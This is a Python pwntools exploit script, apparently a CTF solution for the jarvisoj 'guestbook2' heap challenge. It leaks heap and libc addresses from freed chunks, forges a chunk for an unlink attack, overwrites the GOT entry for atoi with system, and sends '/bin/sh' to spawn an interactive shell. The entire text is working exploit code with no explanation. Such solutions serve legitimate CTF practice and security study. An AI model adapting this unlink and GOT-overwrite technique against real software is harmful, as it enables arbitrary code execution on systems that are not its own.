from pwn import *

p = process('./data/bin/heap23_42_jarvisoj_guestbook2')
elf = ELF('./data/bin/heap23_42_jarvisoj_guestbook2')
libc = elf.libc

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

def new(size,context):
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter("Length of new post: ",str(size))
    p.sendafter('Enter your post: ',context)

def list():
    p.sendlineafter('Your choice: ','1')

def edit(index,size,context):
    p.sendlineafter('Your choice: ','3')
    p.sendlineafter('Post number: ',str(index))
    p.sendlineafter('Length of post: ',str(size))
    p.sendafter('Enter your post: ',context)

def delete(index):
    p.sendlineafter('Your choice: ','4')
    p.sendlineafter('Post number: ',str(index))

new(0x80,0x80*'a') #0
new(0x80,0x80*'b') #1
new(0x80,0x80*'c') #2
new(0x80,0x80*'d') #3

delete(0)
delete(2)
new(8,8*'x')
new(8,8*'w')

list()
p.recvuntil('xxxxxxxx')
heap=u64(p.recv(4).ljust(8,b'\x00'))
log.success('heap: ' + hex(heap))
p.recvuntil('wwwwwwww')
libc_base=u64(p.recv(6).ljust(8,b'\x00'))-0x3c4b78 #0x3c4b78  #
sys_addr=libc_base+libc.symbols['system']#0x45380  0x0000000000045390#
log.success('libc_base: ' + hex(libc_base))
delete(0)
delete(1)
delete(2)
delete(3)
ptr=heap-0x1910
log.success('ptr: ' + hex(ptr))
#debug(p,0x400CA5,0x40106A,0x400B96)     
payload=p64(0)+p64(0x81)+p64(ptr-0x18)+p64(ptr-0x10)
payload=payload.ljust(0x80,b'a')
payload+=p64(0x80)+p64(0x90)
payload+=b'a'*0x80+p64(0x0)+p64(0x71)   
new(len(payload),payload)
delete(1)
payload=p64(0)+p64(1)+p64(0x8)+p64(elf.got['atoi'])
edit(0,0x120,payload.ljust(0x120,b'a'))
edit(0,8,p64(sys_addr))
p.sendlineafter('Your choice: ',b'/bin/sh\x00')
p.interactive()